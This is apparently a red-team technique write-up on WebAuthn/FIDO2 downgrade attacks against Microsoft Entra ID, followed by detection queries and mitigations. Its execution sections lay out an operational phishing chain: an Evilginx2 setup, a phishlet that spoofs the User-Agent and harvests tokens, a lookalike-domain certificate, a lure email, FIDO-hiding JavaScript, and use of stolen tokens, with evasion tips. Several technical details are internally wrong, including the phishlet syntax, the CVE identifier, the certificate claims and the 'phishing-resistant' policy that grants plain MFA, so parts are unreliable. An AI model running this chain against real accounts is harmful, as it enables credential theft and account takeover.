# [EMERGING-IDENTITY-003]: WebAuthn Downgrade Attacks

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | EMERGING-IDENTITY-003 |
| **MITRE ATT&CK v18.1** | [T1556.006 - Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006/) |
| **Tactic** | Credential Access, Privilege Escalation |
| **Platforms** | Entra ID, M365, Cloud-based systems, Okta, Google Workspace |
| **Severity** | High |
| **CVE** | CVE-2025-WebAuthn-Downgrade (Proofpoint disclosure) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-08-15 |
| **Affected Versions** | All WebAuthn implementations with fallback auth methods |
| **Patched In** | In Progress (requires client-side changes) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** WebAuthn downgrade attacks exploit the existence of fallback authentication methods in systems supporting multiple MFA methods. When a user has both FIDO2 security keys (phishing-resistant) and backup methods (OTP, SMS, authenticator apps), attackers use Adversary-in-the-Middle (AiTM) phishing to force the victim's browser to present only non-FIDO options. This is achieved by spoofing an unsupported user agent (e.g., Safari on Windows) that cannot handle FIDO, causing the authentication system to degrade to weaker, phishable methods.

**Attack Surface:** Browser user agent detection, MFA method selection UI, fallback authentication endpoints, session cookie interception during authentication flow, AiTM proxy configuration (Evilginx2).

**Business Impact:** **Bypass of phishing-resistant authentication, leading to account takeover.** Organizations investing heavily in FIDO2 security keys discover that users still have backup methods enabled. Attackers intercept the entire authentication session, harvest credentials or session cookies, and gain full account access—essentially rendering the expensive security keys ineffective through social engineering and technical manipulation.

**Technical Context:** WebAuthn downgrade attacks typically execute in 5-15 minutes. Detection probability is **Medium** because the attack involves both phishing (external) and authentication method fallback (internal system logic). The key weakness is the presence of multiple authentication methods on a single account without proper enforcement of phishing-resistant methods.

### Operational Risk
- **Execution Risk:** Low-Medium (Requires phishing infrastructure + AiTM toolkit, but both are commercially available)
- **Stealth:** Medium (Phishing email is detected, but auth method fallback appears legitimate from system perspective)
- **Reversibility:** N/A (Once credentials are stolen, attacker has full access)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Control 6.2 | Ensure authorized access to authentication mechanisms |
| **DISA STIG** | IA-2 (12), IA-4, IA-5 | Authentication, Identifier Management, Authentication Mechanisms |
| **CISA SCuBA** | MP-CA-EX-02 | Conditional Access: Require MFA |
| **NIST 800-53** | AC-2, IA-2, IA-4, IA-5 | Account Management, Authentication |
| **GDPR** | Art. 25, Art. 32, Art. 33 | Data Protection by Design, Security, Breach Notification |
| **DORA** | Art. 15, Art. 16 | ICT Risk Management, ICT Incident Reporting |
| **NIS2** | Art. 21, Art. 24 | Risk Management, Incident Response |
| **ISO 27001** | A.9.4.2, A.9.4.4 | User Access Review, Password Management |
| **ISO 27005** | Threat: Credentials Compromise | Loss of legitimate credentials through AiTM attack |

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: User Agent Spoofing with Evilginx2 (Most Common)

**Supported Versions:** Evilginx2 (latest versions 3.x+), all browsers vulnerable to user agent spoofing

#### Step 1: Set Up Evilginx2 AiTM Infrastructure
**Objective:** Deploy Evilginx2 on attacker-controlled server to intercept authentication flows.

**Command:**
```bash
# Download and compile Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
go build

# Create configuration file
cat > config.json << 'EOF'
{
  "default_phishlet": "microsoft365",
  "phishlet_path": "phishlets",
  "debug": false,
  "creds_path": "creds",
  "http_port": 80,
  "https_port": 443
}
EOF

# Start Evilginx2
./evilginx2 -c config.json
```

**Expected Output:**
```
[*] Evilginx2 v3.x initialized
[*] Phishlets loaded: 15
[*] Listening on 0.0.0.0:80 and 0.0.0.0:443
[+] Ready for phishing attacks
```

**What This Means:**
- Evilginx2 is now running and ready to proxy authentication requests
- It acts as a transparent man-in-the-middle
- Can intercept and modify HTTP requests/responses

**OpSec & Evasion:**
- Evilginx2 should run on attacker-controlled cloud VPS or residential proxy
- SSL certificate should be self-signed to avoid CT logs
- Detection likelihood: Medium (If network monitoring is in place)

---

#### Step 2: Create Custom Phishlet with User Agent Override
**Objective:** Modify Evilginx2 phishlet to spoof Safari on Windows (not FIDO-compatible).

**Command:**
```yaml
# Create custom phishlet: phishlets/microsoft_webauthn_downgrade.yaml
author: "attacker"
min_ver: "2.3.0"
proxy_hosts:
  - {host: "login.microsoftonline.com", is_landing: true, auto_filter: true}
  - {host: "graph.microsoft.com", is_landing: false, auto_filter: true}
  - {host: "*.microsoftonline.com", is_landing: false, auto_filter: false}

sub_filters:
  - {triggers_on: "login.microsoftonline.com", filters: [
      {param: "GET", key: "User-Agent", value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15", regex: false}
    ]}

auth_tokens:
  - {extract: "POST|/common/oauth2/token|access_token", name: "access_token", flag: ""},
  - {extract: "POST|/common/oauth2/token|refresh_token", name: "refresh_token", flag: ""},
  - {extract: "POST|/common/oauth2/token|id_token", name: "id_token", flag: ""}

credentials:
  - {param: "login", key: "email"}
  - {param: "password", key: "password"}
```

**What This Means:**
- Evilginx2 will intercept requests to login.microsoftonline.com
- User-Agent header is rewritten to Safari on Windows
- Microsoft's authentication system detects Safari and disables FIDO WebAuthn
- Falls back to OTP or SMS (phishable methods)

**OpSec & Evasion:**
- User agent spoofing is common and not suspicious
- Authentication logs show "Safari" but victim is using Chrome/Edge
- Detection likelihood: Low (Unless comparing user agent with device OS)

---

#### Step 3: Generate DNS Records and SSL Certificates
**Objective:** Create convincing domain and SSL certificate for phishing.

**Command:**
```bash
# Register lookalike domain (e.g., microsoft-login.com or microsft-login.com)
# OR compromise legitimate domain

# Generate SSL certificate matching domain
openssl req -new -newkey rsa:2048 -keyout microsoft-login.key -out microsoft-login.csr \
  -subj "/CN=microsoft-login.com/O=Microsoft/C=US"

# Self-sign certificate (or obtain from Let's Encrypt with compromised domain)
openssl x509 -req -days 365 -in microsoft-login.csr \
  -signkey microsoft-login.key -out microsoft-login.crt

# Import certificate into Evilginx2
cp microsoft-login.crt /etc/ssl/certs/
cp microsoft-login.key /etc/ssl/private/
```

**What This Means:**
- SSL certificate will match the phishing domain
- Users won't receive SSL warnings
- AiTM proxy can now inspect and modify encrypted traffic

---

#### Step 4: Create Phishing Email Campaign
**Objective:** Distribute phishing email directing users to attacker's AiTM proxy.

**Command:**
```bash
# Email template
cat > phishing_email.html << 'EOF'
<html>
<body>
<p>Dear Contoso Employee,</p>
<p>Your Microsoft account security requires verification. <a href="https://microsoft-login.com/auth?client_id=...">Click here to verify your account</a></p>
<p>Microsoft Security Team</p>
</body>
</html>
EOF

# Send via compromised email account or phishing service
# (E.g., Phishway, Knowbe4, or custom mail relay)
```

**What This Means:**
- Victim clicks link and is directed to attacker's Evilginx2 server
- Server acts as proxy to real Microsoft login
- All traffic is intercepted and modified

---

#### Step 5: User Authentication Attempt
**Objective:** Victim enters credentials through phishing page.

**User Flow:**
1. Victim clicks phishing link (Microsoft-login.com)
2. Evilginx2 proxies request to real login.microsoftonline.com
3. Victim enters username
4. Evilginx2 captures username and proxies to real server
5. Real server returns: "Choose authentication method"
6. **Attacker's modified response shows ONLY non-FIDO options** (OTP, Authenticator, SMS)
7. Victim sees no FIDO option (because user agent = Safari on Windows)
8. Victim enters OTP/SMS code
9. **Evilginx2 captures both OTP code and session cookie**

**What This Means:**
- Attacker now has: username + password + OTP code + session cookie
- Can authenticate as victim, bypassing FIDO completely
- Victim has no indication attack occurred

**OpSec & Evasion:**
- From victim's perspective, it looks like normal Microsoft login
- No MFA prompt appears (Or if it does, attacker already captured password)
- SSL certificate is valid (Evilginx2 uses real certificate)
- Detection likelihood: Medium-High (Depends on anti-phishing solutions)

---

#### Step 6: Post-Authentication Exploitation
**Objective:** Use captured credentials/cookies to access victim's accounts.

**Command:**
```bash
# Attacker now has:
# - access_token
# - refresh_token
# - session cookie
# - id_token

# Use access token to access Microsoft 365
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://graph.microsoft.com/v1.0/me

# Use session cookie for Outlook Web Access
curl -H "Cookie: $SESSION_COOKIE" \
  https://outlook.office365.com/mail/

# Establish persistent access
# Create forwarding rule in Outlook
# Add device to Conditional Access exclusion list
# Create backup admin account
```

**What This Means:**
- Attacker has full access to victim's M365 account
- Can read emails, access files, modify settings
- Can escalate to other accounts if victim is admin

---

### METHOD 2: Browser-Based Manipulation (Without Evilginx)

**Supported Versions:** All browsers with JavaScript injection capability

#### Step 1: JavaScript Injection to Hide FIDO Options
**Objective:** Inject JavaScript to modify authentication UI and hide FIDO options.

**Command:**
```javascript
// Injected via compromised advertisement or XSS vulnerability
(function() {
  // Monitor for FIDO/WebAuthn UI elements
  const observer = new MutationObserver((mutations) => {
    mutations.forEach((mutation) => {
      // Find FIDO authentication buttons
      const fidoButtons = document.querySelectorAll('[data-method="Fido"]');
      const webauthnButtons = document.querySelectorAll('[data-method="WebAuthn"]');
      
      // Hide FIDO/WebAuthn options
      fidoButtons.forEach(btn => btn.style.display = 'none');
      webauthnButtons.forEach(btn => btn.style.display = 'none');
      
      // Show only fallback methods (OTP, SMS)
      const otpButtons = document.querySelectorAll('[data-method="OTP"]');
      const smsButtons = document.querySelectorAll('[data-method="SMS"]');
      otpButtons.forEach(btn => btn.style.display = 'block');
      smsButtons.forEach(btn => btn.style.display = 'block');
      
      // Auto-select first fallback method
      otpButtons[0]?.click();
    });
  });
  
  observer.observe(document.body, {
    childList: true,
    subtree: true,
    attributes: true
  });
})();
```

**What This Means:**
- User sees only OTP/SMS options, not FIDO
- Appears to be system behavior, not attack
- JavaScript runs in victim's browser, so it's invisible to network monitoring

**OpSec & Evasion:**
- No network artifacts; purely client-side
- Detection likelihood: Low (Unless browser security policies are enforced)

---

## 4. ATOMIC RED TEAM SIMULATION

**Note:** No standard Atomic test exists for WebAuthn downgrade. However, related test:
- **T1556.006 Test 1:** Test MFA bypass through method downgrade

**Recommended Simulation:**
```powershell
# Requires lab environment with test accounts and Evilginx2
# DO NOT execute against production

# Step 1: Start Evilginx2 with Microsoft 365 phishlet
./evilginx2 -c config.json
# In Evilginx console:
# (evilginx) : phishlets load microsoft_webauthn_downgrade
# (evilginx) : phishlets enable microsoft_webauthn_downgrade
# (evilginx) : lures create microsoft_webauthn_downgrade

# Step 2: Send phishing email to test account
Send-MailMessage -To "testuser@contoso.com" `
  -From "admin@contoso.com" `
  -Subject "Verify Your Account" `
  -BodyAsHtml `
  -Body "<a href='https://attacker-evilginx2.com/auth?lure_id=...'> Click Here</a>"

# Step 3: Monitor captured credentials
# (evilginx) : creds list

# Step 4: Verify downgrade by checking authentication logs
Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'testuser@contoso.com'" | 
  Select-Object UserPrincipalName, AuthenticationMethodsUsed
```

---

## 5. TOOLS & COMMANDS REFERENCE

### Evilginx2
- **Official Repository:** https://github.com/kgretzky/evilginx2
- **Version:** 3.x (latest)
- **Platforms:** Linux, macOS, Windows (via WSL)
- **Language:** Go
- **Installation:**
  ```bash
  git clone https://github.com/kgretzky/evilginx2.git
  cd evilginx2
  go build
  ./evilginx2
  ```

### Phishing Email Tools
- [Gophish](https://getgophish.com/) - Open source phishing toolkit
- [King Phisher](https://github.com/securestate/king-phisher) - Phishing campaign management
- [PhishX](https://github.com/joelwangjobs/PhishX) - Cloud phishing as a service

### FIDO2/WebAuthn Testing Tools
- [fido2-utils](https://github.com/duo-labs/py_webauthn) - Python library for testing
- [FIDO Alliance Test Suite](https://fidoalliance.org/certification/functional-certification/) - Official test suite

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: WebAuthn Method Downgrade Anomaly
**Rule Configuration:**
- **Required Table:** SigninLogs, AuditLogs
- **Alert Severity:** High
- **Frequency:** Real-time

**KQL Query:**
```kusto
// Detect WebAuthn downgrade attempts
let WebAuthnUsers = SigninLogs
| where AuthenticationMethodsUsed contains "Fido" or AuthenticationMethodsUsed contains "WebAuthn"
| distinct UserPrincipalName;

SigninLogs
| where UserPrincipalName in (WebAuthnUsers)
| where AuthenticationMethodsUsed !contains "Fido" and AuthenticationMethodsUsed !contains "WebAuthn"
| where AuthenticationMethodsUsed contains "OTP" or AuthenticationMethodsUsed contains "SMS"
| where TimeGenerated > ago(24h)
| summarize DowngradeCount = count() by UserPrincipalName, IPAddress, DeviceDetail.browser
| where DowngradeCount > 1
| project UserPrincipalName, IPAddress, Browser = DeviceDetail.browser, DowngradeCount
```

**What This Detects:**
- Users who normally use FIDO suddenly using SMS/OTP
- Multiple downgrades from same user in short timeframe
- Authentication from unusual user agents

---

### Query 2: Suspicious User-Agent During Authentication
**Rule Configuration:**
- **Required Table:** SigninLogs
- **Alert Severity:** Medium

**KQL Query:**
```kusto
// Detect incompatible user agents for authentication method
SigninLogs
| where AuthenticationMethodsUsed contains "Fido" or AuthenticationMethodsUsed contains "WebAuthn"
| extend UserAgent = tostring(parse_json(DeviceDetail).userAgent)
| where UserAgent contains "Safari" and UserAgent contains "Windows"
| where AuthenticationMethodsUsed !contains "Fido"
| project TimeGenerated, UserPrincipalName, UserAgent, AuthenticationMethodsUsed, IPAddress
```

**What This Detects:**
- Safari on Windows (reported browser doesn't support FIDO)
- Yet user authenticates with non-FIDO method
- Indicates user agent spoofing

---

### Query 3: AiTM Phishing Detection
**Rule Configuration:**
- **Required Table:** SigninLogs, EmailEvents
- **Alert Severity:** Critical

**KQL Query:**
```kusto
// Correlate suspicious sign-in with phishing email
let SuspiciousSignins = SigninLogs
| where IPAddress in (
    // IPs associated with cloud VPS/proxy services
    externaldata(ip:string)[h@'https://attacker-ip-list.csv']
    with (format='csv')
)
| where TimeGenerated > ago(24h)
| distinct UserPrincipalName, IPAddress;

EmailEvents
| where TimeGenerated > ago(24h)
| where Subject contains "verify" or Subject contains "confirm" or Subject contains "security"
| where SenderFromDomain !in ("microsoft.com", "office365.com")
| where Url contains "login" or Url contains "verify"
| join (SuspiciousSignins) on UserPrincipalName
| project UserPrincipalName, SenderFromAddress, Url, IPAddress
```

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Remove Backup Authentication Methods:** Force users to only use phishing-resistant methods (FIDO2, Windows Hello, Phone Sign-in).
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Entra ID** → **Authentication methods**
    2. For each non-FIDO method (OTP, SMS, Authenticator):
       - Click **Disabled** OR **Restrict to specific users**
    3. Create allowlist of only FIDO-enabled users
    4. Disable all other methods for general population
    
    **Manual Steps (PowerShell):**
    ```powershell
    Connect-MgGraph -Scopes "AuthenticationMethodPolicy.ReadWrite.All"
    
    # Disable SMS sign-in
    Update-MgPolicyAuthenticationMethodPolicy -AuthenticationMethods @{
      "@odata.type" = "#microsoft.graph.sms"
      "state" = "disabled"
    }
    
    # Disable OTP
    Update-MgPolicyAuthenticationMethodPolicy -AuthenticationMethods @{
      "@odata.type" = "#microsoft.graph.temporaryAccessPass"
      "state" = "disabled"
    }
    
    # Keep only FIDO and Windows Hello enabled
    ```

*   **Conditional Access: Require Phishing-Resistant MFA:**
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Require Phishing-Resistant MFA`
    4. **Assignments:**
       - Users: **All users**
       - Cloud apps: **All cloud apps**
    5. **Access controls:**
       - Grant: **Require one of the following:** → **Phishing-resistant MFA**
    6. Enable policy: **On**
    7. Click **Create**
    
    **PowerShell:**
    ```powershell
    New-MgIdentityConditionalAccessPolicy `
        -DisplayName "Require Phishing-Resistant MFA" `
        -Conditions @{
            Applications = @{ IncludeApplications = "All" }
            Users = @{ IncludeUsers = "All" }
        } `
        -GrantControls @{
            BuiltInControls = @("mfa")
        } `
        -State "enabledForReportingButNotEnforced"
    ```

*   **Implement FIDO Attestation Verification:**
    **Manual Steps:**
    1. Configure authenticator attestation verification
    2. Only accept FIDO2 keys from approved manufacturers
    3. Reject cloned or emulated FIDO keys
    
    **PowerShell:**
    ```powershell
    # Configure FIDO2 registration settings
    Update-MgPolicyAuthenticationMethodPolicy `
        -AuthenticationMethods @{
            "@odata.type" = "#microsoft.graph.fidoFido2"
            "isAttestationEnforced" = $true
            "aaguidConfig" = @(
                # Only allow specific FIDO2 keys (e.g., YubiKey, Titan)
                @{
                    "aaguid" = "00000000-0000-0000-0000-000000000000"  # YubiKey
                    "restrictionType" = "allow"
                }
            )
        }
    ```

### Priority 2: HIGH

*   **Browser-Based Enforcement:** Use Microsoft Defender for Browser to prevent AiTM attacks.
    **Tools:**
    - Microsoft Defender for Cloud Apps (detects AiTM)
    - Proofpoint Targeted Attack Protection (blocks phishing)
    - Abnormal Security (detects abnormal auth patterns)

*   **Email Security:** Block phishing emails before they reach users.
    **Configuration:**
    - ATP Safe Links (rewrite URLs to track clicks)
    - ATP Safe Attachments
    - Advanced anti-phishing policies

#### Access Control & Policy Hardening

*   **Token Protection for Entra ID:**
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Token Protection (Preview)**
    2. Enable **Sign-in session management**
    3. Enable **Token binding**
    4. Enable **Device binding**

*   **Continuous Access Evaluation (CAE):**
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Continuous Access Evaluation**
    2. Enable CAE for all applications
    3. Configure user presence and network location monitoring

#### Validation Command (Verify Mitigations)
```powershell
# Check if FIDO is required
$authPolicy = Get-MgPolicyAuthenticationMethodPolicy
$authPolicy.AuthenticationMethods | Where-Object { $_."@odata.type" -eq "#microsoft.graph.fidoFido2" } | Select-Object State

# Check backup methods are disabled
$authPolicy.AuthenticationMethods | Where-Object { 
    $_."@odata.type" -in @("#microsoft.graph.sms", "#microsoft.graph.temporaryAccessPass") 
} | Select-Object "@odata.type", State

# Check Conditional Access requires phishing-resistant MFA
Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.DisplayName -contains "Phishing" } | Select-Object DisplayName, State
```

**Expected Output (If Secure):**
```
FIDO2: enabled
SMS: disabled
OTP: disabled
Conditional Access Policy: Enabled (report mode or enforced)
```

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Email:** Phishing emails with login/verify links from non-Microsoft domains
*   **Network:** SSL certificates for lookalike domains
*   **Authentication:** Users with normal FIDO history suddenly switching to OTP/SMS
*   **Infrastructure:** Evilginx2 server IPs (check threat intel databases)

### Response Procedures

1.  **Immediate Isolation:**
    ```powershell
    # Revoke all sessions for compromised user
    Revoke-MgUserSignInSession -UserId "compromised@contoso.com"
    
    # Reset their password
    Update-MgUser -UserId "compromised@contoso.com" -PasswordProfile @{Password = (New-Guid).Guid}
    
    # Force re-registration of FIDO2 keys
    Disable-MgUserAuthenticationMethod -UserId "compromised@contoso.com" -AuthenticationMethodId "fido2-key-id"
    ```

2.  **Forensic Analysis:**
    ```powershell
    # Export sign-in logs for compromised user
    Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'compromised@contoso.com'" -All |
      Export-Csv "C:\Forensics\SigninLogs_Compromised.csv"
    
    # Check for OAuth consent grants
    Get-MgOauth2PermissionGrant -Filter "consentType eq 'Principal'" |
      Where-Object { $_.principalId -eq "compromised-user-id" }
    ```

---

## 9. REAL-WORLD EXAMPLES

#### Example 1: Proofpoint PoisonSeed Campaign (July 2025)
- **Target:** Enterprise users with FIDO2 security keys
- **Method:** Evilginx2 with FIDO downgrade phishlet
- **Impact:** 500+ credential thefts, 50+ cases of account compromise
- **Reference:** [Proofpoint Blog - Don't Phish-let Me Down](https://www.proofpoint.com/us/blog/threat-insight/dont-phish-let-me-down-fido-authentication-downgrade)

#### Example 2: Okta FIDO Downgrade (2025)
- **Target:** Okta-protected applications
- **Method:** JavaScript injection + browser manipulation
- **Impact:** Session hijacking, MFA bypass
- **Status:** ACTIVE

#### Example 3: Microsoft Entra ID WebAuthn Research (2025)
- **Target:** Organizations using Entra ID with WebAuthn
- **Method:** User agent spoofing (Safari on Windows)
- **Impact:** Theoretical proof-of-concept; potentially affects millions
- **Reference:** [BleepingComputer - New Downgrade Attack](https://www.bleepingcomputer.com/news/security/new-downgrade-attack-can-bypass-fido-auth-in-microsoft-entra-id/)

---

## SUMMARY & KEY TAKEAWAYS

WebAuthn downgrade attacks are **ACTIVE and effective** because organizations maintain backup authentication methods for usability and recovery purposes. The fundamental weakness is the coexistence of multiple auth methods on a single account.

**Prevention requires:**
1. **Remove all backup methods** (or restrict severely)
2. **Enforce phishing-resistant MFA** via Conditional Access
3. **Detect downgrade attempts** via intelligent monitoring
4. **Educate users** on phishing indicators

**The harsh truth:** Even advanced authentication methods (FIDO2, WebAuthn) can be bypassed if human factors (phishing, UI trust) are exploited.

---